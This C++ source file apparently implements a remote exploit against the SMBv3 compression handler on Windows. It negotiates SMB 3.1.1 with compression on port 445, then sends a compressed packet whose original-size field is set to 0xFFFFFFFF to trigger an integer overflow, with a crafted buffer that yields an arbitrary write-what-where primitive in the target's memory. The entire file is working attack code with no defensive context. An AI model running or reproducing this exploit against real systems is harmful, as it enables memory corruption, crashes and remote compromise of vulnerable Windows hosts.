#include "stdafx.h"

SOCKET connect_server(const char* ip_address,u_short port)
{
	WSADATA wsaData = { 0 };

	auto iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		wprintf(L"[+] WSAStartup failed: %d\n", iResult);
	}
	else {
		wprintf(L"[+] WSAStartup succeeded\n");
	}

	auto sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		wprintf(L"[+] socket function failed with error = %d\n", WSAGetLastError());
	}
	else {
		wprintf(L"[+] socket function succeeded\n");
	}


	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(ip_address);
	clientService.sin_port = htons(port);
	iResult = connect(sock, (SOCKADDR*)&clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"[+] connect function failed with error: %ld\n", WSAGetLastError());
	}
	else {
		wprintf(L"[+] connect function succeeded\n");
	}
	
	return sock;
}

void send_negotiation(SOCKET sock)
{
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,                   /* session */
		0x00, 0x00, 0xC4,       /* length */  /* total size of packet except NetBIOS Wrapper */

		/* SMB Header */
		0xFE, 0x53, 0x4D, 0x42, /* protocol id */
		0x40, 0x00,             /* structure size, must be 0x40 */
		0x00, 0x00,             /* credit charge */
		0x00, 0x00,             /* channel sequence */
		0x00, 0x00,             /* channel reserved */
		0x00, 0x00,             /* command */
		0x00, 0x00,             /* credits requested */
		0x00, 0x00, 0x00, 0x00, /* flags */
		0x00, 0x00, 0x00, 0x00, /* chain offset */
		0x00, 0x00, 0x00, 0x00, /* message id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x00, 0x00, 0x00, 0x00, /* tree id */
		0x00, 0x00, 0x00, 0x00, /* session id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* signature */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,   //64

		/* SMB Negotiation Request */
		0x24, 0x00,             /* structure size */
		0x08, 0x00,             /* dialect count, 8 */
		0x00, 0x00,             /* security mode */
		0x00, 0x00,             /* reserved */
		0x7F, 0x00, 0x00, 0x00, /* capabilities */
		0x01, 0x02, 0xAB, 0xCD, /* guid */
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x78, 0x00,             /* negotiate context */ /* the offset of SMB header to context */
		0x00, 0x00,             /* additional padding */
		0x02, 0x00,             /* negotiate context count */
		0x00, 0x00,             /* reserved 2 */
		0x02, 0x02,             /* dialects, SMB 2.0.2 */
		0x10, 0x02,             /* SMB 2.1 */
		0x22, 0x02,             /* SMB 2.2.2 */
		0x24, 0x02,             /* SMB 2.2.3 */
		0x00, 0x03,             /* SMB 3.0 */
		0x02, 0x03,             /* SMB 3.0.2 */
		0x10, 0x03,             /* SMB 3.0.1 */
		0x11, 0x03,             /* SMB 3.1.1 */
		0x00, 0x00, 0x00, 0x00, /* padding */   //120

		/* Preauth context */
		0x01, 0x00,             /* type */
		0x26, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x01, 0x00,             /* hash algorithm count */
		0x20, 0x00,             /* salt length */
		0x01, 0x00,             /* hash algorith, SHA512 */
		0x00, 0x00, 0x00, 0x00, /* salt */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,            
		0x00, 0x00,             /* pad */   //168

		/* Compression context */
		0x03, 0x00,             /* type */
		0x0E, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x02, 0x00,             /* compression algorithm count */
		0x00, 0x00,             /* padding */
		0x01, 0x00, 0x00, 0x00, /* flags */
		0x02, 0x00,             /* LZ77 */
		0x03, 0x00,             /* LZ77+Huffman */
		0x00, 0x00, 0x00, 0x00, /* padding */
		0x00, 0x00, 0x00, 0x00                  //196
	};

	if ((err = send(sock, (const char*)buf, sizeof(buf), 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
		printf("[+] Sending SMB negotiation succeeded\n");
	}
	else {
		printf("[+] Sending SMB negotiation error\n");
	}

}

ULONG compress_data(UCHAR* buffer,ULONG buffer_size,UCHAR* compressed_buffer,
			        ULONG compressed_buffer_size)
{
	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	auto err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return 0;
	}
	ULONG FinalCompressedSize;
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return 0;
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,
		compressed_buffer, compressed_buffer_size, 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return 0;
	}


	return FinalCompressedSize;
}

void send_compress(SOCKET sock, UCHAR* compressed_buffe, 
			        ULONG FinalCompressedSize, UCHAR* what, ULONG number_of_bytes_written)
{
	int err = 0;
	char response[8] = { 0 };

	uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,					/* session */ 
		0x00, 0x00, 0x2b,		/* length */  /* total size of packet except NetBIOS Wrapper */

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	/* fix NetBIOS_Wrapper.length */
	ULONG NetBIOS_length = sizeof(buf) + number_of_bytes_written + FinalCompressedSize - 0x4;
	buf[1] = *((uint8_t*)&NetBIOS_length + 2);
	buf[2] = *((uint8_t*)&NetBIOS_length + 1);
	buf[3] = *((uint8_t*)&NetBIOS_length + 0);

	/* set SMB_Header.offset by number_of_bytes_written */
	*reinterpret_cast<PULONG>(buf + 16) = number_of_bytes_written;

	/* combine SMB compressed packet */
	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + number_of_bytes_written + FinalCompressedSize);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return;
	}

	memcpy(packet, buf, sizeof(buf));
	for (ULONG n = 0; n < number_of_bytes_written;n++){
		*(packet + sizeof(buf) + n) = what[n];
	}
	
	memcpy(packet + sizeof(buf) + number_of_bytes_written, compressed_buffe, FinalCompressedSize);

	if ((err = send(sock, (const char*)packet, sizeof(buf) + number_of_bytes_written + FinalCompressedSize, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
		printf("[+] Sending SMB compress succeeded\n");
	}		
	else {
		printf("[+] Sending SMB compress error\n");
		err = WSAGetLastError();
	}

	free(packet);
	return;
}


void send_compress_data(SOCKET sock, UCHAR* what, PVOID where, ULONG number_of_bytes_written)
{
	/* default size*/
	ULONG  buffer_size = 0x1118;
	UCHAR* buffer = static_cast<UCHAR*>(malloc(buffer_size)); // 0x1150 - 0x50 + 0x18 if SMBCompressHeader.offset ==0;
	memset(buffer,NULL, buffer_size);

	/* calculate actual size by number_of_bytes_written */
	buffer_size -= number_of_bytes_written;
	memset(buffer,'A', buffer_size);
	*reinterpret_cast<PVOID*>(buffer + buffer_size) = where;
	buffer_size += sizeof(PVOID);

	/* compressed buffer */
	ULONG  compressed_buffer_size = 64;
	UCHAR* compressed_buffer = static_cast<UCHAR*>(malloc(compressed_buffer_size));
	memset(compressed_buffer,NULL, compressed_buffer_size);
	auto FinalCompressedSize = compress_data(buffer, buffer_size, compressed_buffer, compressed_buffer_size);

	/* send compressed SMB packet */
	send_compress(sock, compressed_buffer, FinalCompressedSize,what,number_of_bytes_written);



	return;
}

bool write_what_where(const char* ip_address, UCHAR* what, PVOID where, ULONG number_of_bytes_written)
{

	auto sock = connect_server(ip_address, 445);
	send_negotiation(sock);
	send_compress_data(sock, what, where, number_of_bytes_written);

	closesocket(sock);
	WSACleanup();
	return true;
}